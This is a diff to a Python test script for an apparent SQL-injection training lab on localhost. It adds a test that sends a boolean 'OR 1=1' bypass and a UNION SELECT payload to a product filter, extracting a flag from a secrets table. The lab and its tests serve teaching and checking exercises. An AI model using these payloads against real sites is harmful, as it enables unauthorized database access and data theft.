@@ -8,7 +8,7 @@ import requests
 import re
 import sys
 
-BASE = "http://localhost:5050"
+BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
 FAILURES = []
 
 
@@ -47,6 +47,20 @@ r = requests.get(f"{BASE}/directory", params={"q": payload})
 flag = extract_flag(r.text)
 check("UNION extraction returns flag", flag == "CTF{un10n_s3l3ct_m4st3r}")
 print(f"    -> extracted: {flag}")
+
+print()
+print("=" * 70)
+print("2a) SQLi — E-Commerce Product Filter (UNION-based Basics)")
+print("=" * 70)
+# Boolean test: reveals unreleased prototype quantum dongle
+r_bool = requests.get(f"{BASE}/products", params={"category": "Hardware' OR 1=1 -- -"})
+check("Boolean bypass reveals unreleased products", "Prototype Quantum Key Dongle" in r_bool.text)
+# UNION extraction test: 2 columns from site_secrets
+payload_prod = "nonexistent' UNION SELECT title, secret_flag FROM site_secrets -- -"
+r_prod = requests.get(f"{BASE}/products", params={"category": payload_prod})
+flag_prod = extract_flag(r_prod.text)
+check("UNION extraction on products returns flag", flag_prod == "CTF{un10n_b4s1cs_m4st3r}")
+print(f"    -> extracted: {flag_prod}")
 
 print()
 print("=" * 70)
